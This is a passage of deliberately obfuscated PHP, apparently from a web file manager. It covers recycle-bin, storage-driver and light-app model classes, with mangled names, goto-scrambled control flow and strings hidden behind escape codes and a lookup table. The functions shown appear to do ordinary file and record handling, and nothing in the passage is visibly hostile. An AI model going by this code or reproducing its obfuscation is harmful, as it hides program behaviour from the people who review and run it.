clearstatcache(); if ($cÃ…£òš†‚ && $FàŸï½æœè) { return !0; } cacheLockWait(); } while (microtime(!0) < $BĞ‘ÈåºÂå); goto F°Òò‚ğ–‘; F°Òò‚ğ–‘: $this->unlock($aìóøÈÊÊõ); return !1; goto e­ğÉõÒ—ğ; a¬‡çÜÄ¨“: $c è·Å‹ì˜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BôÆ®ÀëŞ¦ = microtime(!0); $BĞ‘ÈåºÂå = $BôÆ®ÀëŞ¦ + $FƒÔ·¬˜Ñ + 0.0001; goto EĞÙ—ÔÚâ¼; e­ğÉõÒ—ğ: } public function lockGet($Dà˜†½‹°) { $b‡Ë¢ÀÏö« =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÇÑ†ÀõªÛ = rtrim(self::$cachePath, $b‡Ë¢ÀÏö«[8]) . $b‡Ë¢ÀÏö«[787] . md5($Dà˜†½‹°) . $b‡Ë¢ÀÏö«[784]; return file_exists($eÇÑ†ÀõªÛ); } public function unlock($BéåÎéŠòé) { goto e×ĞŞÅÆ¥á; DöÈ¼¤Œ®õ: unset(self::$caches[$BéåÎéŠòé]); goto Fâ‡Û¸¤; dá‹ŸÜËÒÜ: @flock($e×Ò«éŞ•[$dœÂªè”õµ[789]], LOCK_UN); @fclose($e×Ò«éŞ•[$dœÂªè”õµ[789]]); @unlink($e×Ò«éŞ•[$dœÂªè”õµ[171]]); goto DöÈ¼¤Œ®õ; e×ĞŞÅÆ¥á: $dœÂªè”õµ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e×Ò«éŞ• = self::$caches[$BéåÎéŠòé]; if (!$e×Ò«éŞ•) { return; } goto dá‹ŸÜËÒÜ; Fâ‡Û¸¤: } } goto D§•ÁŠ˜ó; aÃ”ŠŸ•£÷: define($_SERVER[ÈİÅ¿ÈÈ¥×][233], 2); define($_SERVER[ÈİÅ¿ÈÈ¥×][234], 3); define($_SERVER[ÈİÅ¿ÈÈ¥×][235], 1); goto DÖ¦Å¢Šçï; C…ÙêÔ‰ùÇ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\145\x5f\162\x65\143\x79\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e")); public function listData($E×ğäŒê‰ê = false) { $E¯‘õéœ˜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E×ğäŒê‰ê = $E×ğäŒê‰ê ? $E×ğäŒê‰ê : USER_ID; $B‚ÃÙÌŒ´® = $this->where(array($E¯‘õéœ˜[1482] => $E×ğäŒê‰ê))->select(); return array_to_keyvalue($B‚ÃÙÌŒ´®, $E¯‘õéœ˜[33], $E¯‘õéœ˜[385]); } public function moveToRecycle($Eªï†‹ƒ¸) { goto FØ½„®«ò; E¼¶ÖÉª¤: if (!$dŞï…È¶‘ || $dŞï…È¶‘[$eÌóŒŸ¸çí[413]] == $eÌóŒŸ¸çí[83]) { return; } $cÔ†øÙ’äá = array($eÌóŒŸ¸çí[399] => $Eªï†‹ƒ¸, $eÌóŒŸ¸çí[1482] => USER_ID, $eÌóŒŸ¸çí[538] => $dŞï…È¶‘[$eÌóŒŸ¸çí[387]], $eÌóŒŸ¸çí[539] => $dŞï…È¶‘[$eÌóŒŸ¸çí[473]], $eÌóŒŸ¸çí[542] => $dŞï…È¶‘[$eÌóŒŸ¸çí[476]]); $this->add($cÔ†øÙ’äá); goto C®¯’Èá‚Ç; C®¯’Èá‚Ç: $this->recycleMove($Eªï†‹ƒ¸, 1); if ($dŞï…È¶‘[$eÌóŒŸ¸çí[386]] == $eÌóŒŸ¸çí[83]) { $a—¤æÁó¦ã = array($eÌóŒŸ¸çí[542] => array($eÌóŒŸ¸çí[500], $dŞï…È¶‘[$eÌóŒŸ¸çí[476]] . $Eªï†‹ƒ¸ . $eÌóŒŸ¸çí[501])); $bÚÔÌ¹Ç®Œ->where($a—¤æÁó¦ã)->setField($eÌóŒŸ¸çí[413], 1); } goto aÒÆ³âºĞº; FØ½„®«ò: $eÌóŒŸ¸çí =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÚÔÌ¹Ç®Œ = Model($eÌóŒŸ¸çí[1167]); $dŞï…È¶‘ = $bÚÔÌ¹Ç®Œ->sourceInfo($Eªï†‹ƒ¸); goto E¼¶ÖÉª¤; aÒÆ³âºĞº: } public function clear() { $this->remove(!1); } public function remove($böÓÚššæÂ = false) { goto D†¥ğÚ©ì¸; D†¥ğÚ©ì¸: $dâÌ“â©Æ– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bƒ«Ø™ƒ‹º = Model($dâÌ“â©Æ–[1167]); $BŒ¤½«Â = $this->listData(); goto E¨¾Æ¢ÕŠ…; E¨¾Æ¢ÕŠ…: $böÓÚššæÂ = $böÓÚššæÂ === !1 ? !1 : $böÓÚššæÂ; $Eß‡œµÙÔ… = array(); foreach ($BŒ¤½«Â as $B“Ë´ÙŠš) { if ($böÓÚššæÂ != !1 && !in_array($B“Ë´ÙŠš, $böÓÚššæÂ)) { continue; } $f†ªÈ—ëÉ = $Bƒ«Ø™ƒ‹º->sourceInfo($B“Ë´ÙŠš); $Bƒ«Ø™ƒ‹º->remove($B“Ë´ÙŠš, !1); $fæòÔÁÁğ = $f†ªÈ—ëÉ[$dâÌ“â©Æ–[387]] . $dâÌ“â©Æ–[70] . $f†ªÈ—ëÉ[$dâÌ“â©Æ–[473]]; $Eß‡œµÙÔ…[$fæòÔÁÁğ] = array($dâÌ“â©Æ–[538] => $f†ªÈ—ëÉ[$dâÌ“â©Æ–[387]], $dâÌ“â©Æ–[473] => $f†ªÈ—ëÉ[$dâÌ“â©Æ–[473]]); $this->where(array($dâÌ“â©Æ–[385] => $B“Ë´ÙŠš))->delete(); } goto e¦ØÙÇ²—·; e¦ØÙÇ²—·: foreach ($Eß‡œµÙÔ… as $eß÷‚¼‰«é) { $Bƒ«Ø™ƒ‹º->targetSpaceUpdate($eß÷‚¼‰«é[$dâÌ“â©Æ–[387]], $eß÷‚¼‰«é[$dâÌ“â©Æ–[473]]); } goto ešªÜĞõè; ešªÜĞõè: } public function restore($eÎö‹àğ»¹ = false) { goto b‘‘Ê¢Ú˜; CÒ³Íê‘œç: $eÎö‹àğ»¹ = $eÎö‹àğ»¹ == !1 ? !1 : $eÎö‹àğ»¹; if (!$d“‘§‚¼øÛ) { return !0; } $E­‚ÄĞÇÔ = array(); goto E´Œ¡ÀÄÉç; E´Œ¡ÀÄÉç: foreach ($d“‘§‚¼øÛ as $CÂî®ì©¤) { goto dß¡‹ÉØ; B±Ãğ‚Ûğì: if ($A±ïá£æé[$dô®÷ÒœÂä[386]] == $dô®÷ÒœÂä[83]) { $FÓ¨Ö¢‰¢ = array($dô®÷ÒœÂä[542] => array($dô®÷ÒœÂä[500], $A±ïá£æé[$dô®÷ÒœÂä[476]] . $CÂî®ì©¤ . $dô®÷ÒœÂä[501])); $d«µöµà®æ->where($FÓ¨Ö¢‰¢)->setField($dô®÷ÒœÂä[413], 0); $this->restoreFolderChildren($CÂî®ì©¤, $d“‘§‚¼øÛ); } $this->where(array($dô®÷ÒœÂä[385] => $CÂî®ì©¤))->delete(); $d«µöµà®æ->folderSizeReset($A±ïá£æé[$dô®÷ÒœÂä[478]]); goto AÍø’†µäŸ; dß¡‹ÉØ: if ($eÎö‹àğ»¹ != !1 && !in_array($CÂî®ì©¤, $eÎö‹àğ»¹)) { continue; } $A±ïá£æé = $d«µöµà®æ->sourceInfo($CÂî®ì©¤); $e°ä‡•¸Ş™ = $d«µöµà®æ->sourceInfo($A±ïá£æé[$dô®÷ÒœÂä[478]]); goto A³ãŸÔ¨Ëó; AÍø’†µäŸ: $E­‚ÄĞÇÔ[] = $A±ïá£æé[$dô®÷ÒœÂä[478]]; if ($A±ïá£æé[$dô®÷ÒœÂä[386]] == $dô®÷ÒœÂä[83]) { $E­‚ÄĞÇÔ[] = $CÂî®ì©¤; } $d«µöµà®æ->lockMoveEnd($CÂî®ì©¤); goto bÓ¿—ë…á; A³ãŸÔ¨Ëó: if ($e°ä‡•¸Ş™[$dô®÷ÒœÂä[413]] == $dô®÷ÒœÂä[83]) { continue; } $d«µöµà®æ->lockMoveStart($CÂî®ì©¤); $this->recycleMove($CÂî®ì©¤, 0); goto B±Ãğ‚Ûğì; bÓ¿—ë…á: } $d«µöµà®æ->updateModifyTime($E­‚ÄĞÇÔ); goto BõÙ–‚–»; b‘‘Ê¢Ú˜: $dô®÷ÒœÂä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d«µöµà®æ = Model($dô®÷ÒœÂä[1167]); $d“‘§‚¼øÛ = $this->listData(); goto CÒ³Íê‘œç; BõÙ–‚–»: } private function restoreFolderChildren($Aƒ÷˜²ÇùË, $E›©Ş—Ëé) { goto c÷¬Ü‹´ºŠ; f¾¶†ªÅô: $D‹æ¥ïÃ¾—[$FÆÓ£¼™[385]][1] = array_unique($D‹æ¥ïÃ¾—[$FÆÓ£¼™[385]][1]); $D‹æ¥ïÃ¾—[$FÆÓ£¼™[922]] = $FÆÓ£¼™[1739]; $D¨Ëƒ‘öŠŞ->where($D‹æ¥ïÃ¾—)->setField($FÆÓ£¼™[413], 1); goto a¬ùÏ£±×; c÷¬Ü‹´ºŠ: $FÆÓ£¼™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¨Ëƒ‘öŠŞ = Model($FÆÓ£¼™[1167]); $D‹æ¥ïÃ¾— = array($FÆÓ£¼™[385] => array($FÆÓ£¼™[7], array())); goto aŸå•µ¬—Ñ; aŸå•µ¬—Ñ: foreach ($E›©Ş—Ëé as $FŠ†¬¥„š”) { if ($FŠ†¬¥„š” == $Aƒ÷˜²ÇùË) { continue; } if (!$D¨Ëƒ‘öŠŞ->isParentOf($Aƒ÷˜²ÇùË, $FŠ†¬¥„š”)) { continue; } $Eõ¥Šğ ‡ = $D¨Ëƒ‘öŠŞ->sourceInfo($FŠ†¬¥„š”); if ($Eõ¥Šğ ‡[$FÆÓ£¼™[386]] == $FÆÓ£¼™[83]) { $D‹æ¥ïÃ¾—[] = array($FÆÓ£¼™[542] => array($FÆÓ£¼™[500], $Eõ¥Šğ ‡[$FÆÓ£¼™[476]] . $FŠ†¬¥„š” . $FÆÓ£¼™[501])); } else { $D‹æ¥ïÃ¾—[$FÆÓ£¼™[385]][1][] = $FŠ†¬¥„š”; } } if (!$D‹æ¥ïÃ¾—[$FÆÓ£¼™[385]][1]) { unset($D‹æ¥ïÃ¾—[$FÆÓ£¼™[385]]); } if (!$D‹æ¥ïÃ¾—) { return; } goto f¾¶†ªÅô; a¬ùÏ£±×: } private function recycleMove($f×®®Ğìš¤, $Fä™†”Õˆ‘ = 1) { $c›§««÷¶Ç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¤› Áœæ¼ = Model($c›§««÷¶Ç[1167]); $FØñ•÷‘ÄÏ = Model($c›§««÷¶Ç[1945]); $dÍ„¢•Ä±â = array($c›§««÷¶Ç[385] => $f×®®Ğìš¤); if ($Fä™†”Õˆ‘) { $B¤› Áœæ¼->where($dÍ„¢•Ä±â)->setField($c›§««÷¶Ç[413], 1); $FØñ•÷‘ÄÏ->eventRecycle($f×®®Ğìš¤, $c›§««÷¶Ç[1946]); } else { $DùÌ¹²‰‡ = $B¤› Áœæ¼->where($dÍ„¢•Ä±â)->find(); $FíŞ§šÚÌ = $DùÌ¹²‰‡[$c›§««÷¶Ç[386]] == $c›§««÷¶Ç[83]; $e´²²ŒĞ™ = $B¤› Áœæ¼->fileNameAuto($DùÌ¹²‰‡[$c›§««÷¶Ç[478]], $DùÌ¹²‰‡[$c›§««÷¶Ç[28]], REPEAT_RENAME_FOLDER, $FíŞ§šÚÌ); if ($e´²²ŒĞ™ != $DùÌ¹²‰‡[$c›§««÷¶Ç[28]]) { $B¤› Áœæ¼->rename($f×®®Ğìš¤, $e´²²ŒĞ™); } $B¤› Áœæ¼->where($dÍ„¢•Ä±â)->setField($c›§««÷¶Ç[413], 0); $FØñ•÷‘ÄÏ->eventRecycle($f×®®Ğìš¤, $c›§««÷¶Ç[1947]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\163\164\157\162\x61\x67\145\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\x65\x4d\x61\170", "\x73\x79\x73\x74\145\155", "\x64\x65\146\141\165\x6c\164", "\x64\x72\x69\x76\145\162", "\143\x6f\x6e\146\151\x67"); public function listData($cÅ® åòÁğ = false, $b½³‹à©ç‰ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\x65", $DÇÊùßÚ¢¼ = false) { goto E‘îàÍõ¤©; fáë¼šÌˆ: foreach ($D¶Èö³‘° as $B¬Ì×âƒ¿» => $B¯±¼†„¾) { unset($D¶Èö³‘°[$B¬Ì×âƒ¿»][$a¨´éŸ  š[6]]); $D¶Èö³‘°[$B¬Ì×âƒ¿»][$a¨´éŸ  š[1636]] = 0; } $DÂÚÇÆàì“ = array_to_keyvalue($D¶Èö³‘°, $a¨´éŸ  š[33], $a¨´éŸ  š[383]); $this->_listAppendSize($D¶Èö³‘°, $DÂÚÇÆàì“); goto dÙ»ˆ–Ç–; dÙ»ˆ–Ç–: return $D¶Èö³‘°; goto bÊ……”äÊ; E‘îàÍõ¤©: $a¨´éŸ  š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¶Èö³‘° = parent::listData($cÅ® åòÁğ, $b½³‹à©ç‰, $DÇÊùßÚ¢¼); if ($cÅ® åòÁğ) { return $D¶Èö³‘°; } goto fáë¼šÌˆ; bÊ……”äÊ: } public function _listAppendSize(&$B£õ¾ÄºÊÄ, $EÈˆÔ ôĞ§) { $FõÂœ¨Ù»ì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$EÈˆÔ ôĞ§) { return; } $EÏ­ªÑ¸ãô = $FõÂœ¨Ù»ì[1948] . implode($FõÂœ¨Ù»ì[47], $EÈˆÔ ôĞ§) . $FõÂœ¨Ù»ì[1949]; $F¦øâ°Ì³Ò = Model($FõÂœ¨Ù»ì[726])->query($EÏ­ªÑ¸ãô); $F¦øâ°Ì³Ò = array_to_keyvalue($F¦øâ°Ì³Ò, $FõÂœ¨Ù»ì[383], $FõÂœ¨Ù»ì[77]); foreach ($B£õ¾ÄºÊÄ as $FÎã¢Á‹ö => $FòæÜ”œªÖ) { $B£õ¾ÄºÊÄ[$FÎã¢Á‹ö][$FõÂœ¨Ù»ì[1636]] = isset($F¦øâ°Ì³Ò[$FòæÜ”œªÖ[$FõÂœ¨Ù»ì[383]]]) ? $F¦øâ°Ì³Ò[$FòæÜ”œªÖ[$FõÂœ¨Ù»ì[383]]] : 0; } } public function getConfig($A§ğğ’è”¬) { $f˜²ï±õ © = parent::listData($A§ğğ’è”¬); return json_decode($f˜²ï±õ ©[$_SERVER[ÈİÅ¿ÈÈ¥×][6]], !0); } public function update($E½éç“ó, $d¦Å«À‰‚’) { goto CïŸ«À˜Á¬; CïŸ«À˜Á¬: $E½ÍƒğÕØ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D†Ø‚è‚ğè = $d¦Å«À‰‚’[$E½ÍƒğÕØ[28]]; $BÁ„öÄ´¨÷ = array_to_keyvalue(parent::listData(), $E½ÍƒğÕØ[28]); goto fë°¶İ²„; AƒÆÒæ•½: $fÊ¯’Ä›†ª = parent::update($E½éç“ó, $d¦Å«À‰‚’); if ($fÊ¯’Ä›†ª && $d¦Å«À‰‚’[$E½ÍƒğÕØ[34]]) { foreach ($BÁ„öÄ´¨÷ as $A° éï¶…œ) { if ($A° éï¶…œ[$E½ÍƒğÕØ[34]] && $A° éï¶…œ[$E½ÍƒğÕØ[383]] != $E½éç“ó) { parent::update($A° éï¶…œ[$E½ÍƒğÕØ[383]], array($E½ÍƒğÕØ[34] => 0)); } } } return $fÊ¯’Ä›†ª; goto aÁÍ®ßá¥; fë°¶İ²„: if (isset($BÁ„öÄ´¨÷[$D†Ø‚è‚ğè]) && $BÁ„öÄ´¨÷[$D†Ø‚è‚ğè][$E½ÍƒğÕØ[383]] != $E½éç“ó) { return !1; } if (isset($d¦Å«À‰‚’[$E½ÍƒğÕØ[1950]]) && $d¦Å«À‰‚’[$E½ÍƒğÕØ[1950]] == $E½ÍƒğÕØ[83]) { $this->checkConfig($d¦Å«À‰‚’); } unset($d¦Å«À‰‚’[$E½ÍƒğÕØ[1950]]); goto AƒÆÒæ•½; aÁÍ®ßá¥: } public function add($EÄŒœÛàœš) { goto b£Ş°»…; b£Ş°»…: $c°µØ‡ÄªÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FËÎÍ³èÎ¸ = array_to_keyvalue(parent::listData(), $c°µØ‡ÄªÆ[28]); if (isset($FËÎÍ³èÎ¸[$EÄŒœÛàœš[$c°µØ‡ÄªÆ[28]]])) { return !1; } goto D¤¯Âº³†; D¤¯Âº³†: $this->checkConfig($EÄŒœÛàœš); $B§Ğ³ŠÍÑé = parent::insert($EÄŒœÛàœš); if ($B§Ğ³ŠÍÑé && $EÄŒœÛàœš[$c°µØ‡ÄªÆ[34]]) { foreach ($FËÎÍ³èÎ¸ as $eâ×ï´³èğ) { if ($eâ×ï´³èğ[$c°µØ‡ÄªÆ[34]]) { parent::update($eâ×ï´³èğ[$c°µØ‡ÄªÆ[383]], array($c°µØ‡ÄªÆ[34] => 0)); } } } goto e¾‹«†Èåİ; e¾‹«†Èåİ: return $B§Ğ³ŠÍÑé; goto aåóË¾´; aåóË¾´: } public function checkConfig(&$b¿ÈĞ¾½¼) { goto A›Ş”²¤â; DœÆà‘±„â: $Fˆª¼àÖ• = isset($E¸·ÎŞ×¬®[$d…„±á‰Å]) ? $E¸·ÎŞ×¬®[$d…„±á‰Å] : ucfirst($d…„±á‰Å); $fÙ’æéË¼ = $C÷é‡•œÏ¥[71] . $Fˆª¼àÖ•; if (!$Fˆª¼àÖ• || !class_exists($fÙ’æéË¼)) { write_log(array($C÷é‡•œÏ¥[1952], $b¿ÈĞ¾½¼, get_caller_info()), $C÷é‡•œÏ¥[1953]); show_json(LNG($C÷é‡•œÏ¥[1954]), !1, $b¿ÈĞ¾½¼); } goto A‹öóÑÊ÷Ù; A›Ş”²¤â: $C÷é‡•œÏ¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d…„±á‰Å = strtolower($b¿ÈĞ¾½¼[$C÷é‡•œÏ¥[90]]); $cõî‰œ—† = json_decode($b¿ÈĞ¾½¼[$C÷é‡•œÏ¥[6]], !0); goto D¸Šó‹ŸÈ; eÑ¡‰¿Á: $b¿ÈĞ¾½¼[$C÷é‡•œÏ¥[6]] = json_encode($cõî‰œ—†); $b¿ÈĞ¾½¼[$C÷é‡•œÏ¥[90]] = $Fˆª¼àÖ•; return !0; goto a‡±âÁæÕ; D¸Šó‹ŸÈ: foreach ($cõî‰œ—† as $DÕºÌÎØç => $Aµ³Â£ã‚å) { $cõî‰œ—†[$DÕºÌÎØç] = trim($Aµ³Â£ã‚å); } $cõî‰œ—†[$C÷é‡•œÏ¥[1951]] = rand_string(6); $E¸·ÎŞ×¬® = $GLOBALS[$C÷é‡•œÏ¥[6]][$C÷é‡•œÏ¥[84]][$C÷é‡•œÏ¥[760]]; goto DœÆà‘±„â; Eá¯î¹Ö™ø: $f›ª•ÖÒ¶È = $EŞÇŒœàä->getPath($DÃÙ°ŒŒ . $C÷é‡•œÏ¥[1100]); if (!$EŞÇŒœàä->mkfile($f›ª•ÖÒ¶È)) { show_json(LNG($C÷é‡•œÏ¥[1955]), !1); } $cõî‰œ—†[$C÷é‡•œÏ¥[1040]] = $DÃÙ°ŒŒ; goto eÑ¡‰¿Á; A‹öóÑÊ÷Ù: $EŞÇŒœàä = new $fÙ’æéË¼($cõî‰œ—†); if (in_array($d…„±á‰Å, $EŞÇŒœàä->objectDriver)) { if (!$EŞÇŒœàä->isBucketCors() && !$EŞÇŒœàä->setBucketCors()) { $b—Ú ß× = LNG($C÷é‡•œÏ¥[1955]); $b—Ú ß× .= $C÷é‡•œÏ¥[1956] . LNG($C÷é‡•œÏ¥[1957]); show_json($b—Ú ß×, !1); } } $DÃÙ°ŒŒ = rtrim($cõî‰œ—†[$C÷é‡•œÏ¥[1040]], $C÷é‡•œÏ¥[8]) . $C÷é‡•œÏ¥[8]; goto Eá¯î¹Ö™ø; a‡±âÁæÕ: } public function driverListSystem() { $eòŠÍŸÂ©Æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÓé˜îù = parent::listData(); $CàÒ™•òè = array(); foreach ($FÓé˜îù as $a‘ÂëÛšæ¦) { unset($a‘ÂëÛšæ¦[$eòŠÍŸÂ©Æ[190]], $a‘ÂëÛšæ¦[$eòŠÍŸÂ©Æ[107]]); $a‘ÂëÛšæ¦[$eòŠÍŸÂ©Æ[6]] = json_decode($a‘ÂëÛšæ¦[$eòŠÍŸÂ©Æ[6]], !0); $CàÒ™•òè[] = $a‘ÂëÛšæ¦; } return $CàÒ™•òè; } public function defaultDriver() { $A£ó™’Ê„î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aİ¬«§ŒÌ÷ = parent::listData(); $Câ‡ê‹Œ¡Ò = array_filter_by_field($aİ¬«§ŒÌ÷, $A£ó™’Ê„î[34], 1); $Câ‡ê‹Œ¡Ò = $Câ‡ê‹Œ¡Ò[0]; if ($Câ‡ê‹Œ¡Ò) { $Câ‡ê‹Œ¡Ò[$A£ó™’Ê„î[6]] = json_decode($Câ‡ê‹Œ¡Ò[$A£ó™’Ê„î[6]], !0); } return $Câ‡ê‹Œ¡Ò; } public function driverInfo($D‹¼¶Ñ£˜) { $A´Ê„Êæ»‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÍõ…Á¿óæ = array_to_keyvalue(parent::listData(), $A´Ê„Êæ»‚[383]); if (!isset($bÍõ…Á¿óæ[$D‹¼¶Ñ£˜])) { return !1; } $Bä‘Õ¨¸Ü› = $bÍõ…Á¿óæ[$D‹¼¶Ñ£˜]; $Bä‘Õ¨¸Ü›[$A´Ê„Êæ»‚[6]] = json_decode($Bä‘Õ¨¸Ü›[$A´Ê„Êæ»‚[6]], !0); return $Bä‘Õ¨¸Ü›; } public function remove($D—·õÚì¼ƒ) { $this->removeShareItems($D—·õÚì¼ƒ); return parent::remove($D—·õÚì¼ƒ); } public function removeWithFile($B‰Š¢ …Ñ‡, $C¡°Ø¼†Ş) { goto bÄÍÃ–Àà; DæÏÍ¬ò©: if (!$dçÏ¹åÑ³‰) { $BÑ†éÕŒ•ˆ->stop($C¸ÓƒÀåÒŸ); return !1; } $BÑ†éÕŒ•ˆ->end(); if ($C¡°Ø¼†Ş == $eò‚á‹‘[1616]) { $this->remove($B‰Š¢ …Ñ‡); } goto fÕ¿ä†ƒï; bÄÍÃ–Àà: $eò‚á‹‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÚ‡•²›Ïç = array($eò‚á‹‘[751] => $B‰Š¢ …Ñ‡); $DğëÈôŒ = Model($eò‚á‹‘[438])->where($CÚ‡•²›Ïç)->count(); goto eë‚„˜•–Ú; eë‚„˜•–Ú: $DÕå‹ŞÂ‚è = Model($eò‚á‹‘[438])->where($CÚ‡•²›Ïç)->sum($eò‚á‹‘[77]); $C¸ÓƒÀåÒŸ = $C¡°Ø¼†Ş . $eò‚á‹‘[1958] . $B‰Š¢ …Ñ‡; $BÑ†éÕŒ•ˆ = new TaskFileTransfer($C¸ÓƒÀåÒŸ, $eò‚á‹‘[1953], $DğëÈôŒ, LNG($eò‚á‹‘[1959]) . "\50{$B‰Š¢ …Ñ‡}\x29"); goto AÂë«ô³Öğ; AÂë«ô³Öğ: $BÑ†éÕŒ•ˆ->task[$eò‚á‹‘[706]] = (double) $DÕå‹ŞÂ‚è; $c’ö–´—· = KodIO::defaultDriver(); $E¦òºâ®¾” = $c’ö–´—·[$eò‚á‹‘[383]]; goto e¹â¯Üçù; F“ß†Å”àã: $d’÷•ÍÑö¯ = Model($eò‚á‹‘[171])->where($CÚ‡•²›Ïç)->field($eò‚á‹‘[1960])->select(); foreach ($d’÷•ÍÑö¯ as $A¬âÏ´Œ£Ş) { goto b¨™ŸÄ“·¹; bµÈøÑ˜•È: $c‰ÜîÀºÑ‚ = array($eò‚á‹‘[751] => $E¦òºâ®¾”, $eò‚á‹‘[75] => $E¿ò¯™‘ä‰); Model($eò‚á‹‘[171])->where($CÚ‡•²›Ïç)->save($c‰ÜîÀºÑ‚); goto D²Í‰±–íé; b¨™ŸÄ“·¹: $e…ËÕá÷Û† = $A¬âÏ´Œ£Ş[$eò‚á‹‘[75]]; $E¿ò¯™‘ä‰ = $d²Ç‚¥½•Ğ . str_replace("\x7b\x69\157\72{$B‰Š¢ …Ñ‡}\175\x2f", $eò‚á‹‘[33], $e…ËÕá÷Û†); if (!IO::exist($e…ËÕá÷Û†)) { $CâÜÊ¬„½[] = $A¬âÏ´Œ£Ş[$eò‚á‹‘[435]]; $BÑ†éÕŒ•ˆ->updateFileEnd($A¬âÏ´Œ£Ş[$eò‚á‹‘[28]], $A¬âÏ´Œ£Ş[$eò‚á‹‘[77]]); continue; } goto A·ï¯°ÑÕˆ; A·ï¯°ÑÕˆ: if (IO::exist($E¿ò¯™‘ä‰)) { $BÑ†éÕŒ•ˆ->updateFileEnd($A¬âÏ´Œ£Ş[$eò‚á‹‘[28]], $A¬âÏ´Œ£Ş[$eò‚á‹‘[77]]); continue; } if (!IO::move($e…ËÕá÷Û†, get_path_father($E¿ò¯™‘ä‰))) { $dçÏ¹åÑ³‰ = !1; break; } $CÚ‡•²›Ïç = array($eò‚á‹‘[435] => $A¬âÏ´Œ£Ş[$eò‚á‹‘[435]]); goto bµÈøÑ˜•È; D²Í‰±–íé: } $this->removeByFileID($CâÜÊ¬„½); goto DæÏÍ¬ò©; e¹â¯Üçù: $d²Ç‚¥½•Ğ = "\173\151\157\x3a{$E¦òºâ®¾”}\175\x2f"; $dçÏ¹åÑ³‰ = !0; $CâÜÊ¬„½ = array(); goto F“ß†Å”àã; fÕ¿ä†ƒï: } public function progress($eÊ•†»ª˜, $AÎÓ‰¬ƒè) { return Task::get($AÎÓ‰¬ƒè . $_SERVER[ÈİÅ¿ÈÈ¥×][1958] . $eÊ•†»ª˜); } private function removeByFileID($FÜ·ÃÃÓÛ² = array()) { goto B±¯ŸŸ±; B±¯ŸŸ±: $EŸˆŠòŒÃæ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($FÜ·ÃÃÓÛ²)) { return; } $e„Í—‚†ñÀ = array($EŸˆŠòŒÃæ[435] => array($EŸˆŠòŒÃæ[7], $FÜ·ÃÃÓÛ²)); goto cÎŠ¿ó‹õ; a¨ôñ¡¥ÅÚ: foreach ($D½œ°óÄØ as $cÉ´ä¹¹‹Ÿ) { Model($EŸˆŠòŒÃæ[398])->removeNow($cÉ´ä¹¹‹Ÿ, !1); } goto Aß©§„é“Ş; cÎŠ¿ó‹õ: $D½œ°óÄØ = Model($EŸˆŠòŒÃæ[1167])->where($e„Í—‚†ñÀ)->field($EŸˆŠòŒÃæ[385])->select(); if (!$D½œ°óÄØ) { return; } $D½œ°óÄØ = array_to_keyvalue($D½œ°óÄØ, $EŸˆŠòŒÃæ[33], $EŸˆŠòŒÃæ[385]); goto a¨ôñ¡¥ÅÚ; Aß©§„é“Ş: } private function removeShareItems($d«æœª»—×) { goto aÎó…˜–Ë×; DïíÙëÉ: $bÜ’«î×» = Model($dóƒËÍ–“[1627])->where($d…»‘Œ–Ö)->field($dóƒËÍ–“[456])->select(); if (empty($bÜ’«î×»)) { return; } $F›±±·Ëì = array_to_keyvalue($bÜ’«î×», $dóƒËÍ–“[33], $dóƒËÍ–“[456]); goto DÏ‹†×†º”; DÏ‹†×†º”: Model($dóƒËÍ–“[552])->remove($F›±±·Ëì); goto BªÁ½³¥ÀÑ; aÎó…˜–Ë×: $dóƒËÍ–“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DŒ¸ù—½ó = "\173\x69\x6f\72{$d«æœª»—×}\175\57"; $d…»‘Œ–Ö = array($dóƒËÍ–“[385] => 0, $dóƒËÍ–“[1035] => array($dóƒËÍ–“[373], "{$DŒ¸ù—½ó}\45")); goto DïíÙëÉ; BªÁ½³¥ÀÑ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\114\x69\x67\150\164\x41\x70\160"; public $modelType = "\x53\171\163\164\145\155\x4f\x70\x74\x69\157\x6e"; public $field = array("\156\141\155\x65", "\147\162\157\165\x70", "\144\x65\163\x63", "\x63\x6f\x6e\164\x65\x6e\164"); public function listData($A±“ÔÄèŸ° = false, $Cã½¸¤©³• = "\x6d\x6f\x64\x69\x66\x79\124\151\x6d\x65", $DÕ˜ˆù†ø = true) { return parent::listData($A±“ÔÄèŸ°, $Cã½¸¤©³•, $DÕ˜ˆù†ø); } public function remove($F‘Àáœ…ìÒ) { $Få½Â²Ó½´ = $this->findByName($F‘Àáœ…ìÒ); if (!$Få½Â²Ó½´) { return !1; } return parent::remove($Få½Â²Ó½´[$_SERVER[ÈİÅ¿ÈÈ¥×][383]]); } public function add($cö–”óÚÈ¬) { if ($this->findByName($cö–”óÚÈ¬[$_SERVER[ÈİÅ¿ÈÈ¥×][28]])) { return !1; } return parent::insert($cö–”óÚÈ¬); } public function update($F¿¯Í“³ÍÁ, $cÈŠ¯Ãâ) { $dÉµ«Ëä®¢ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; 